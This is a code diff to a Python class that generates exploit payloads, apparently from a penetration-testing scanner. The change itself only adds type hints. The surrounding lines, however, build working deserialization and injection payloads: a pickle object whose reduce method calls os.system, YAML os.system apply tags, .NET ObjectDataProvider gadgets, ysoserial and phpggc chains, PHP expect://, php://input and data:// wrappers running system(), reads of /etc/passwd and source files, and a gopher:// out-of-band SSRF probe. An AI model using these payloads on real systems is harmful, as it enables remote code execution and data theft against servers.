@@ -7,6 +7,7 @@ import sys
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from tool_config import get_tool_path, get_oob_domain
+from Utility.schemas import ExploitResult, MutationVector, Mutations, MutationPayload
 
 class PayloadMutation:
 
@@ -37,13 +38,13 @@ class PayloadMutation:
         ],
     }
 
-    def __init__(self, exploit_result: dict, vector: dict) -> None:
+    def __init__(self, exploit_result: ExploitResult, vector: MutationVector) -> None:
         self.exploit = exploit_result
         self.vector  = vector
-        self.probe   = exploit_result.get("suggested_probe", "")
-        self.etype   = exploit_result.get("exploit_type", "")
+        self.probe: str = exploit_result.get("suggested_probe") or ""
+        self.etype: str = exploit_result.get("exploit_type") or ""
 
-    def mutate(self) -> list[dict]:
+    def mutate(self) -> Mutations:
         if self.probe == "ysoserial":
             return self._mutate_java()
         if self.probe == "urldns_probe":
@@ -120,7 +121,7 @@ class PayloadMutation:
             print("[!] java not found")
             return None
 
-    def _make_payload(self, ptype, chain, command, b64) -> dict:
+    def _make_payload(self, ptype: str, chain: str | None, command: str | None, b64: str) -> MutationPayload:
         
         url_safe = b64.replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')
 
@@ -137,8 +138,8 @@ class PayloadMutation:
             "encoding":          "base64",
         }
 
-    def _mutate_java(self) -> list[dict]:
-        results = []
+    def _mutate_java(self) -> Mutations:
+        results: Mutations = []
         chains  = self._resolve_chains()
 
         if not os.path.exists(self.YSOSERIAL_PATH):
@@ -161,7 +162,7 @@ class PayloadMutation:
         return results
 
 
-    def _mutate_java_urldns(self) -> list[dict]:
+    def _mutate_java_urldns(self) -> Mutations:
         if not os.path.exists(self.YSOSERIAL_PATH):
             return [{
                 "error": "ysoserial-all.jar not found",
@@ -364,8 +365,8 @@ class PayloadMutation:
         except Exception:
             return "unknown"
         
-    def _php_mutation(self) -> list[dict]:
-        results = []
+    def _php_mutation(self) -> Mutations:
+        results: Mutations = []
         
         chains = self.__resolve_php_chain()
         if not os.path.exists(self.PHPGGC_PATH):
@@ -406,8 +407,8 @@ class PayloadMutation:
         return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
     
     
-    def __flip_boolean(self, payload: str) -> list[dict]:
-        results = []
+    def __flip_boolean(self, payload: str) -> Mutations:
+        results: Mutations = []
         if "b:0" in payload:
             mutated = payload.replace("b:0", "b:1")
             encode_mutatedd = base64.b64encode(mutated.encode()).decode()
@@ -420,8 +421,8 @@ class PayloadMutation:
             
         return results
     
-    def __modify_string(self, payload: str) -> list[dict]:
-        results = []
+    def __modify_string(self, payload: str) -> Mutations:
+        results: Mutations = []
         test_values = ["administrator", "admin", "root", "superuser"]
         
         for m in re.finditer(r's:(\d+):"([^"]+)"', payload):
@@ -448,8 +449,8 @@ class PayloadMutation:
         
         return results
     
-    def _mutate_integer(self, payload: str) -> list[dict]:
-        results    = []
+    def _mutate_integer(self, payload: str) -> Mutations:
+        results: Mutations = []
         int_values = [1, 2, 99, 100, 9999]
 
         import re
@@ -466,8 +467,8 @@ class PayloadMutation:
         
         
         
-    def __mutated_php_choose(self) -> list[dict]:
-        results = []
+    def __mutated_php_choose(self) -> Mutations:
+        results: Mutations = []
         origin = self.vector.get("value", "")
         if self.probe == "flip_boolean":
             results += self.__flip_boolean(origin)
@@ -488,8 +489,8 @@ class PayloadMutation:
         def __reduce__(self):
             return (os.system, (self.command,))
 
-    def _mutate_pickle(self) -> list[dict]:
-        results = []
+    def _mutate_pickle(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.PICKLE_TEST_COMMANDS:
             try:
                 raw = pickle.dumps(self._PickleRCE(cmd))
@@ -504,8 +505,8 @@ class PayloadMutation:
 
     YAML_TEST_COMMANDS = TEST_COMMANDS
 
-    def _mutate_yaml(self) -> list[dict]:
-        results = []
+    def _mutate_yaml(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.YAML_TEST_COMMANDS:
             raw = (
                 "!!python/object/apply:os.system\n"
@@ -521,8 +522,8 @@ class PayloadMutation:
 
     NODEJS_TEST_COMMANDS = TEST_COMMANDS
 
-    def _mutate_nodejs(self) -> list[dict]:
-        results = []
+    def _mutate_nodejs(self) -> Mutations:
+        results: Mutations = []
 
         if self.probe == "node_serialize":
             for cmd in self.NODEJS_TEST_COMMANDS:
@@ -549,8 +550,8 @@ class PayloadMutation:
 
     RUBY_TEST_COMMANDS = TEST_COMMANDS
 
-    def _mutate_ruby(self) -> list[dict]:
-        results = []
+    def _mutate_ruby(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.RUBY_TEST_COMMANDS:
             ruby_script = (
                 "require 'base64'; "
@@ -625,8 +626,8 @@ class PayloadMutation:
             print(f"[!] Could not run ysoserial.net: {e}")
             return None
 
-    def _mutate_dotnet_viewstate(self) -> list[dict]:
-        results = []
+    def _mutate_dotnet_viewstate(self) -> Mutations:
+        results: Mutations = []
         formatter = self._resolve_dotnet_formatter()
 
         if not os.path.exists(self.YSOSERIALNET_PATH):
@@ -646,8 +647,8 @@ class PayloadMutation:
 
         return results
 
-    def _mutate_dotnet_jsonnet(self) -> list[dict]:
-        results = []
+    def _mutate_dotnet_jsonnet(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.DOTNET_TEST_COMMANDS:
             raw = (
                 '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
@@ -670,7 +671,7 @@ class PayloadMutation:
 
     WRAPPER_TEST_COMMANDS = TEST_COMMANDS
 
-    def _mutate_wrapper(self) -> list[dict]:
+    def _mutate_wrapper(self) -> Mutations:
         if self.probe == "rce":
             return self._mutate_wrapper_expect()
         if self.probe == "phar_deser":
@@ -689,8 +690,8 @@ class PayloadMutation:
             return self._mutate_wrapper_stream()
         return []
 
-    def _mutate_wrapper_expect(self) -> list[dict]:
-        results = []
+    def _mutate_wrapper_expect(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.WRAPPER_TEST_COMMANDS:
             raw = f"expect://{cmd}"
             b64 = base64.b64encode(raw.encode()).decode()
@@ -700,8 +701,8 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    def _mutate_wrapper_phar(self) -> list[dict]:
-        results = []
+    def _mutate_wrapper_phar(self) -> Mutations:
+        results: Mutations = []
         chains = self.__resolve_php_chain()
 
         if not os.path.exists(self.PHPGGC_PATH):
@@ -749,7 +750,7 @@ class PayloadMutation:
                 continue
         return None
 
-    def _mutate_wrapper_ssrf(self) -> list[dict]:
+    def _mutate_wrapper_ssrf(self) -> Mutations:
         oob_domain = get_oob_domain()
         if oob_domain:
             raw = f"gopher://{oob_domain}:80/_GET%20/oob-ssrf-check%20HTTP/1.1"
@@ -757,7 +758,7 @@ class PayloadMutation:
             canary_payload = self._make_payload("wrapper_ssrf_oob_canary", "gopher/oob-canary", None, b64)
             canary_payload["payload_raw"] = raw
             canary_payload["note"] = f"Blind SSRF confirmation — check {oob_domain}'s interaction log for an inbound connection"
-            canary_result = [canary_payload]
+            canary_result: Mutations = [canary_payload]
         else:
             canary_result = []
 
@@ -789,8 +790,8 @@ class PayloadMutation:
         )
         return canary_result + [payload]
 
-    def _mutate_wrapper_php_input(self) -> list[dict]:
-        results = []
+    def _mutate_wrapper_php_input(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.WRAPPER_TEST_COMMANDS:
             raw = f"<?php system('{cmd}'); ?>"
             b64 = base64.b64encode(raw.encode()).decode()
@@ -802,8 +803,8 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    def _mutate_wrapper_data(self) -> list[dict]:
-        results = []
+    def _mutate_wrapper_data(self) -> Mutations:
+        results: Mutations = []
         for cmd in self.WRAPPER_TEST_COMMANDS:
             code = f"<?php system('{cmd}'); ?>"
             data_uri = f"data://text/plain;base64,{base64.b64encode(code.encode()).decode()}"
@@ -814,13 +815,13 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    def _mutate_wrapper_lfi(self) -> list[dict]:
+    def _mutate_wrapper_lfi(self) -> Mutations:
         targets = [
             ("file:///etc/passwd", "Unix credential file"),
             ("file://C:\\Windows\\win.ini", "Windows config file"),
             ("php://filter/convert.base64-encode/resource=index.php", "Source code disclosure"),
         ]
-        results = []
+        results: Mutations = []
         for raw, desc in targets:
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("wrapper_lfi", desc, None, b64)
@@ -828,7 +829,7 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    def _mutate_wrapper_traversal(self) -> list[dict]:
+    def _mutate_wrapper_traversal(self) -> Mutations:
         raw = "glob:///etc/*"
         b64 = base64.b64encode(raw.encode()).decode()
         payload = self._make_payload("wrapper_traversal", "glob://", None, b64)
@@ -836,7 +837,7 @@ class PayloadMutation:
         payload["note"] = "Lists directory contents via glob:// stream wrapper — adjust path per target OS"
         return [payload]
 
-    def _mutate_wrapper_stream(self) -> list[dict]:
+    def _mutate_wrapper_stream(self) -> Mutations:
         raw = "compress.zlib://php://filter/convert.base64-encode/resource=index.php"
         b64 = base64.b64encode(raw.encode()).decode()
         payload = self._make_payload("wrapper_stream", "compress.zlib://", None, b64)
